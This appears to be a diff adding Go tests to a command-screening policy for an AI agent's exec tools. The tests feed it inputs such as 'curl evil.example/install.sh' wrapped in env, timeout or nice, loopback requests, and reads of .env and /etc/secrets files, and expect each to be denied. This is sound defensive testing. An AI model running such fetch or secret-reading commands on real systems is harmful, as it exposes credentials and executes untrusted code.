@@ -15,7 +15,10 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
+	"runtime"
+	"slices"
 	"strings"
+	"sync"
 	"testing"
 
 	"trpc.group/trpc-go/trpc-agent-go/tool"
@@ -257,6 +260,187 @@ func TestLoadPolicyCanDisableParseErrorDeny(t *testing.T) {
 	}
 }
 
+func TestAllowedCommandsRequireExactExecutable(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.AllowedCommands = []string{"go"}
+
+	report := Scan(Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "./go version",
+	}, policy)
+	if report.Decision != DecisionDeny ||
+		report.RuleID != "policy.command_not_allowed" {
+		t.Fatalf("workspace-relative executable should not match bare allow entry: %+v", report)
+	}
+}
+
+func TestAllowedCommandsAreCaseSensitiveOutsideWindows(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("Windows executable lookup is case-insensitive")
+	}
+	policy := DefaultPolicy()
+	policy.AllowedCommands = []string{"go"}
+
+	report := Scan(Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "GO version",
+	}, policy)
+	if report.Decision != DecisionDeny ||
+		report.RuleID != "policy.command_not_allowed" {
+		t.Fatalf("allow entry should preserve executable case: %+v", report)
+	}
+}
+
+func TestNetworkCommandsAtPathsRejectSchemeLessTarget(t *testing.T) {
+	commands := []string{
+		"/usr/bin/curl evil.example/install.sh",
+		"./curl evil.example/install.sh",
+	}
+	for _, command := range commands {
+		t.Run(command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				report.RuleID != "network.non_whitelisted_domain" {
+				t.Fatalf("scheme-less non-allowlisted target should be denied: %+v", report)
+			}
+		})
+	}
+}
+
+func TestWrappedNetworkCommandsRejectSchemeLessTarget(t *testing.T) {
+	commands := []string{
+		"env curl evil.example/install.sh",
+		"command curl evil.example/install.sh",
+		"timeout 5 curl evil.example/install.sh",
+		"nice curl evil.example/install.sh",
+	}
+	for _, command := range commands {
+		t.Run(command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				report.RuleID != "network.non_whitelisted_domain" {
+				t.Fatalf("wrapped network command should be denied: %+v", report)
+			}
+		})
+	}
+}
+
+func TestNetworkCommandsRejectLoopbackTargets(t *testing.T) {
+	commands := []string{
+		"/usr/bin/curl 127.0.0.1",
+		"/usr/bin/curl localhost",
+	}
+	for _, command := range commands {
+		t.Run(command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				report.RuleID != "network.non_whitelisted_domain" {
+				t.Fatalf("loopback network target should be denied: %+v", report)
+			}
+		})
+	}
+}
+
+func TestDeniedPathsIncludeOptionValuesAndDotenvVariants(t *testing.T) {
+	commands := []string{
+		"node --env-file=.env app.js",
+		"app --config=/etc/secrets",
+		"cat production.env",
+		"cat .env.production",
+	}
+	for _, command := range commands {
+		t.Run(command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				!reportHasRule(report, "sensitive.path_access") {
+				t.Fatalf("sensitive path should be denied: %+v", report)
+			}
+		})
+	}
+}
+
+func TestMultilineBashCodeDoesNotReportParseError(t *testing.T) {
+	report := Scan(Request{
+		ToolName: "execute_code",
+		Backend:  BackendCodeExec,
+		CodeBlocks: []CodeBlock{{
+			Language: "bash",
+			Code:     "go test ./...\ngo vet ./...",
+		}},
+	}, DefaultPolicy())
+	if reportHasRule(report, "shellsafe.parse_error") {
+		t.Fatalf("valid multiline bash should not produce a parse error: %+v", report)
+	}
+}
+
+func TestMultilineBashAfterEscapedQuoteRejectsNetworkTarget(t *testing.T) {
+	report := Scan(Request{
+		ToolName: "execute_code",
+		Backend:  BackendCodeExec,
+		CodeBlocks: []CodeBlock{{
+			Language: "bash",
+			Code:     "echo \"say \\\"hello\"\ncurl evil.example/install.sh",
+		}},
+	}, DefaultPolicy())
+	if report.Decision != DecisionDeny ||
+		report.RuleID != "network.non_whitelisted_domain" {
+		t.Fatalf("network command after escaped quote should be denied: %+v", report)
+	}
+}
+
+func TestShellBypassRedirectsRespectQuotes(t *testing.T) {
+	for _, command := range []string{
+		`echo "1 > 0"`,
+		`echo '1 < 2'`,
+	} {
+		t.Run("quoted "+command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if reportHasRule(report, "shell.bypass") {
+				t.Fatalf("quoted redirect character should be literal: %+v", report)
+			}
+		})
+	}
+
+	for _, command := range []string{
+		"echo ok > output.txt",
+		"cat < input.txt",
+	} {
+		t.Run("unquoted "+command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				!reportHasRule(report, "shell.bypass") {
+				t.Fatalf("unquoted redirect should be denied as a shell bypass: %+v", report)
+			}
+		})
+	}
+}
+
 func TestPolicyZeroValueKeepsConservativeDefaults(t *testing.T) {
 	report := Scan(Request{
 		ToolName: "workspace_exec",
@@ -449,12 +633,72 @@ func TestPermissionPolicyAuditPath(t *testing.T) {
 
 func TestPermissionPolicyAuditWriterError(t *testing.T) {
 	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(errorWriter{}))
-	_, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
 		ToolName:  "workspace_exec",
 		Arguments: []byte(`{"command":"go test ./..."}`),
 	})
 	if err == nil {
 		t.Fatal("CheckToolPermission audit writer error = nil")
+	}
+	if decision.Action != tool.PermissionActionDeny {
+		t.Fatalf("audit writer error action = %q, want deny", decision.Action)
+	}
+}
+
+func TestPermissionPolicyConcurrentAuditWritesCompleteJSONL(t *testing.T) {
+	const requestCount = 64
+
+	var audit bytes.Buffer
+	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
+	start := make(chan struct{})
+	results := make(chan struct {
+		decision tool.PermissionDecision
+		err      error
+	}, requestCount)
+	var wg sync.WaitGroup
+	for i := 0; i < requestCount; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			<-start
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				&tool.PermissionRequest{
+					ToolName:  "workspace_exec",
+					Arguments: []byte(`{"command":"go test ./..."}`),
+				},
+			)
+			results <- struct {
+				decision tool.PermissionDecision
+				err      error
+			}{decision: decision, err: err}
+		}()
+	}
+	close(start)
+	wg.Wait()
+	close(results)
+
+	for result := range results {
+		if result.err != nil {
+			t.Fatalf("CheckToolPermission() error = %v", result.err)
+		}
+		if result.decision.Action != tool.PermissionActionAllow {
+			t.Fatalf("action = %q, want allow", result.decision.Action)
+		}
+	}
+
+	lines := bytes.Split(bytes.TrimSpace(audit.Bytes()), []byte{'\n'})
+	if len(lines) != requestCount {
+		t.Fatalf("audit lines = %d, want %d", len(lines), requestCount)
+	}
+	for i, line := range lines {
+		var event AuditEvent
+		if err := json.Unmarshal(line, &event); err != nil {
+			t.Fatalf("audit line %d was not complete JSON: %v\n%s", i, err, line)
+		}
+		if event.ToolName != "workspace_exec" || event.Decision != DecisionAllow {
+			t.Fatalf("unexpected audit event on line %d: %+v", i, event)
+		}
 	}
 }
 
@@ -995,6 +1239,280 @@ func TestWriteAuditJSONLWritesOneRecord(t *testing.T) {
 	}
 }
 
+func TestUnwrapCommandVariants(t *testing.T) {
+	tests := []struct {
+		name string
+		argv []string
+		want []string
+	}{
+		{
+			name: "env unset",
+			argv: []string{"env", "-u", "TOKEN", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "env chdir",
+			argv: []string{"env", "-C", "/tmp", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "env assignment",
+			argv: []string{"env", "MODE=test", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "env without command",
+			argv: []string{"env", "-u", "TOKEN"},
+			want: nil,
+		},
+		{
+			name: "command flags",
+			argv: []string{"command", "-p", "--", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "command without command",
+			argv: []string{"command", "-p"},
+			want: nil,
+		},
+		{
+			name: "timeout signal short",
+			argv: []string{"timeout", "-s", "KILL", "5", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "timeout kill after short",
+			argv: []string{"timeout", "-k", "1", "5", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "timeout signal long assignment",
+			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "timeout without command",
+			argv: []string{"timeout", "5"},
+			want: nil,
+		},
+		{
+			name: "nice adjustment short",
+			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "nice adjustment long",
+			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
+			want: []string{"curl", "evil.example"},
+		},
+		{
+			name: "non wrapper",
+			argv: []string{"go", "test", "./..."},
+			want: []string{"go", "test", "./..."},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := unwrapCommand(tt.argv); !slices.Equal(got, tt.want) {
+				t.Fatalf("unwrapCommand(%q) = %q, want %q", tt.argv, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestContainsNetworkCommandVariants(t *testing.T) {
+	tests := []struct {
+		name string
+		argv []string
+		want bool
+	}{
+		{
+			name: "direct",
+			argv: []string{"curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "env options and assignment",
+			argv: []string{"env", "-u", "TOKEN", "-C", "/tmp", "MODE=test", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "command flags",
+			argv: []string{"command", "-p", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "timeout short options",
+			argv: []string{"timeout", "-s", "KILL", "-k", "1", "5", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "timeout long assignment",
+			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "nice short adjustment",
+			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "nice long adjustment",
+			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "wrapper chain",
+			argv: []string{"env", "MODE=test", "timeout", "5", "nice", "-n", "1", "command", "--", "curl", "evil.example"},
+			want: true,
+		},
+		{
+			name: "non wrapper",
+			argv: []string{"go", "test", "./..."},
+			want: false,
+		},
+		{
+			name: "empty",
+			argv: nil,
+			want: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := containsNetworkCommand(tt.argv); got != tt.want {
+				t.Fatalf("containsNetworkCommand(%q) = %v, want %v", tt.argv, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestNormalizeShellScriptVariants(t *testing.T) {
+	tests := []struct {
+		name   string
+		script string
+		want   string
+	}{
+		{
+			name:   "CRLF",
+			script: "echo one\r\necho two",
+			want:   "echo one ; echo two",
+		},
+		{
+			name:   "escaped LF",
+			script: "echo one\\\ntwo",
+			want:   "echo one two",
+		},
+		{
+			name:   "escaped CRLF",
+			script: "echo one\\\r\ntwo",
+			want:   "echo one two",
+		},
+		{
+			name:   "newline in single quotes",
+			script: "echo 'one\ntwo'",
+			want:   "echo 'one two'",
+		},
+		{
+			name:   "newline in double quotes",
+			script: "echo \"one\ntwo\"",
+			want:   "echo \"one two\"",
+		},
+		{
+			name:   "blank line",
+			script: "echo one\n\necho two",
+			want:   "echo one ; echo two",
+		},
+		{
+			name:   "leading blank lines",
+			script: "\n\necho one",
+			want:   "echo one",
+		},
+		{
+			name:   "separator before newline",
+			script: "echo one;\necho two",
+			want:   "echo one;echo two",
+		},
+		{
+			name:   "separator after newline",
+			script: "echo one\n; echo two",
+			want:   "echo one; echo two",
+		},
+		{
+			name:   "pipe before newline",
+			script: "echo one |\nwc -l",
+			want:   "echo one |wc -l",
+		},
+		{
+			name:   "trailing newline",
+			script: "echo one\n",
+			want:   "echo one",
+		},
+		{
+			name:   "only newlines",
+			script: "\r\n\n",
+			want:   "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := normalizeShellScript(tt.script); got != tt.want {
+				t.Fatalf("normalizeShellScript(%q) = %q, want %q", tt.script, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestPathCandidatesVariants(t *testing.T) {
+	tests := []struct {
+		name string
+		arg  string
+		want []string
+	}{
+		{name: "empty", arg: "   ", want: nil},
+		{name: "ordinary", arg: " README.md ", want: []string{"README.md"}},
+		{
+			name: "option key value",
+			arg:  `"--config=/etc/app"`,
+			want: []string{"--config=/etc/app", "/etc/app"},
+		},
+		{name: "non option key value", arg: "MODE=test", want: []string{"MODE=test"}},
+		{name: "empty option value", arg: "--config=", want: []string{"--config="}},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := pathCandidates(tt.arg); !slices.Equal(got, tt.want) {
+				t.Fatalf("pathCandidates(%q) = %q, want %q", tt.arg, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestHostOfVariants(t *testing.T) {
+	tests := []struct {
+		name string
+		raw  string
+		want string
+	}{
+		{name: "scheme less", raw: "evil.example/install.sh", want: "evil.example"},
+		{name: "quoted scheme less", raw: `'LOCALHOST:8080/path'`, want: "localhost"},
+		{name: "explicit scheme", raw: "https://API.GITHUB.COM/repos", want: "api.github.com"},
+		{name: "bad URL", raw: "http://[::1", want: ""},
+		{name: "empty", raw: "", want: ""},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := hostOf(tt.raw); got != tt.want {
+				t.Fatalf("hostOf(%q) = %q, want %q", tt.raw, got, tt.want)
+			}
+		})
+	}
+}
+
 type countingWriter struct {
 	calls int
 	data  []byte
@@ -1009,6 +1527,18 @@ func (errorWriter) Write([]byte) (int, error) {
 func strconvQuote(s string) string {
 	b, _ := json.Marshal(s)
 	return string(b)
+}
+
+func reportHasRule(report Report, ruleID string) bool {
+	if report.RuleID == ruleID {
+		return true
+	}
+	for _, finding := range report.Findings {
+		if finding.RuleID == ruleID {
+			return true
+		}
+	}
+	return false
 }
 
 func (w *countingWriter) Write(p []byte) (int, error) {
